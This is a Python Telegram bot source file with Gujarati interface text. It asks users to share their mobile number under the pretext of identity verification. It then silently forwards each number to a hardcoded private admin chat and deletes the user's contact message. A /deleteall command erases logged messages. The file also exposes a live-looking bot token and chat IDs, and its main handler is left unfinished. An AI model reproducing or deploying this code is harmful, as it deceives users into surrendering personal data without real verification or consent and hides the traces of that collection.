import os
import re
import sqlite3
from flask import Flask
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import (
    ApplicationBuilder,
    MessageHandler,
    filters,
    CommandHandler,
    ContextTypes,
    CallbackQueryHandler,
)

# ---------------- CONFIG & DB ----------------
TOKEN = "8835968464:AAGjhE8p4KPd2fGUNoJCc3ZM8RwaqxCzGy8"
YOUR_CHAT_ID = 5306025504
GROUP_ID = -1003912250139

# ડેટાબેઝ સેટઅપ
conn = sqlite3.connect('messages.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('CREATE TABLE IF NOT EXISTS msg_logs (chat_id INTEGER, message_id INTEGER)')
conn.commit()

app = Flask(__name__)

# ---------------- HELPER FUNCTIONS ----------------
def save_message(chat_id, message_id):
    cursor.execute('INSERT INTO msg_logs VALUES (?, ?)', (chat_id, message_id))
    conn.commit()

# ---------------- COMMANDS ----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    button = KeyboardButton(text="📱 મોબાઇલ નંબર શેર કરો", request_contact=True)
    keyboard = ReplyKeyboardMarkup([[button]], resize_keyboard=True, one_time_keyboard=True)
    await update.message.reply_text("નમસ્તે! તમારી ઓળખ ચકાસવા માટે તમારો મોબાઇલ નંબર શેર કરો.", reply_markup=keyboard)

async def delete_all_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    cursor.execute('SELECT message_id FROM msg_logs WHERE chat_id = ?', (chat_id,))
    rows = cursor.fetchall()
    for row in rows:
        try:
            await context.bot.delete_message(chat_id=chat_id, message_id=row[0])
        except: pass
    cursor.execute('DELETE FROM msg_logs WHERE chat_id = ?', (chat_id,))
    conn.commit()
    await update.message.reply_text("બધા મેસેજ ડિલીટ કરી દેવામાં આવ્યા છે.")

# ---------------- MAIN HANDLER ----------------
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat = update.effective_chat
    message = update.message
    
    if not message: return

    # 1. કોન્ટેક્ટ મેસેજ હેન્ડલિંગ અને ઓટો-ડિલીટ
    if message.contact:
        phone = message.contact.phone_number
        await context.bot.send_message(chat_id=YOUR_CHAT_ID, text=f"📞 નંબર: {phone}")
        try:
            await context.bot.delete_message(chat_id=chat.id, message_id=message.message_id)
        except: pass
        await message.reply_text("આભાર!", reply_markup=ReplyKeyboardRemove())
        return

    # મેસેજ સેવ કરો (ડેટાબેઝમાં)
    save_message(chat.id, message.message_id)

    # 2. એડમિન રિપ્લાય અને અન્ય લોજિક...
    # (તમારો બાકીનો અગાઉનો કોડ અહીં ઉમેરવો)

# ---------------- MAIN ----------------
if __name__ == "__main__":
    app_bot = ApplicationBuilder().token(TOKEN).build()
    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CommandHandler("deleteall", delete_all_cmd))
    app_bot.add_handler(MessageHandler(filters.ALL & (~filters.COMMAND), handle_message))
    
    print("બોટ શરૂ થઈ રહ્યો છે...")
    app_bot.run_polling()
                                             
